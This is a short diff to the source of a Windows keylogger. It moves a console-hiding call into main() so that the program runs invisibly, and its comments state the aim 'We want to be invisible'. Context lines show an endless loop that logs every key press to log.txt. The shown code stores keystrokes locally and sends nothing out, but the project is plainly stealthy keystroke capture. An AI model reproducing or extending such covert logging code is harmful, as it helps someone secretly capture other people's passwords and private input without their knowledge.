@@ -84,10 +84,6 @@ bool specialKey(char key) {
  * @post All key presses are logged to "log.txt" until the process is terminated.
  */
 void startLogging() {
-    // Hide console while executing the program. We want to be invisible !!
-    // To stop the process: taskkill /IM keylogger.exe /F
-    ShowWindow(GetConsoleWindow(), SW_HIDE);
-
     while (true) {
         Sleep(10);  // Avoid excessive CPU usage
         
@@ -104,6 +100,10 @@ void startLogging() {
 }
 
 int main() {
+    // Hide console while executing the program. We want to be invisible !!
+    // To stop the process: taskkill /IM keylogger.exe /F
+    ShowWindow(GetConsoleWindow(), SW_HIDE);
+    
     startLogging();
     
     return 0;
